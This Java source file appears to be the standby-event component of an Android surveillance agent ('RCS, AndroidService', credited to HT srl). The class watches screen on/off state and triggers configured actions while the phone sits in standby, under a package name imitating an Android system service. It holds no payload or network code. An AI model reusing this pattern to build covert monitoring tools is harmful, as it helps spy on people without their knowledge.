/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventStandby.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.Standby;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerStandby;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

public class EventStandby extends BaseEvent implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "EventStandby"; //$NON-NLS-1$

	private int actionOnEnter, actionOnExit;

	@Override
	public void begin() {
		ListenerStandby.self().attach(this);
	}

	@Override
	public void end() {
		ListenerStandby.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		return true;
	}

	@Override
	public void go() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Standby s) {
		// Stato dello schermo ON/OFF
		if (s.getStatus() == true) {
			// SCREEN ON
			onExit();
		} else {
			// STANDBY
			onEnter();
		}

		return 0;
	}

	public void onEnter() {
		triggerStartAction();
	}

	public void onExit() {
		triggerStopAction();
	}
}
